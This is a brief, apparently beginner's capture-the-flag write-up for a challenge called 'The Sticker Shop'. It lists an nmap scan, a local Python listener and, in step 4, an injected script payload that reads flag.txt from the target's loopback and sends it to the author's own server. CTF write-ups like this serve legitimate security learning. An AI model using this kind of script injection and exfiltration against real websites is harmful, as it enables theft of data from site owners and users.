# CTF Writeup: The Sticker Shop

1. Step: Scanned Target ip with following command: nmap -A -F -oN nmap.txt <target.ip>  
2. step: port 8080 is open  
3. step: created local python server -> python3 -m http.server <local-ip>  
4. step: looked up website and did html injection in submit field with following code:  
  
<script>  
fetch('http://127.0.0.1:8080/flag.txt')  
  .then(response => response.text())  
  .then (data => {fetch('http://10.10.93.80:8000/?flag=' + encodeURIComponent(data));});  
</script>  
  
5. step: accessed local loopback to gather flag.txt and receive response and converted response into string value, stored in "data" gestored and displayed on my local pythn3 server.  


## My Learnings

### - First Contact with Enumeration Tools like nmap
### - First Contact with creating local hosted servers
### - First Contact with HTML Injections
### - First Experience creating a script, which outputs content locally to our loopback ipv4

